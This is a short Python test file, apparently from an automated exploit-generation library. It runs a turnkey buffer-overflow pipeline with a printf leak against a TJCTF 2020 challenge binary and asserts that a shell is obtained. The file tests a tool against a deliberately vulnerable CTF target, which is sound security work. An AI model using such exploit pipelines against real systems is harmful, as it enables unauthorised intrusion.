from .. import *

BIN = "./tests/tjctf_2020/stop"


def test_stop(exploit):
    # this is the example from the README
    def send_letter_first(tube, data):
        # the binary expects us to choose a letter first, before it takes input unsafely
        tube.sendline("A")
        # send actual payload
        tube.sendline(data)

    # create a starting state - modified to use fixture
    s = exploit(BIN, lambda: process(BIN))
    # set an overwriter function, if the buffer overflow input
    # is not available immediately
    s.overwriter = send_letter_first

    # use base classic pipeline, with printf for leaking
    pipeline = turnkey.Classic(leak=leak.Printf())
    result = pipeline(s)

    assert assertion.have_shell(result.target)
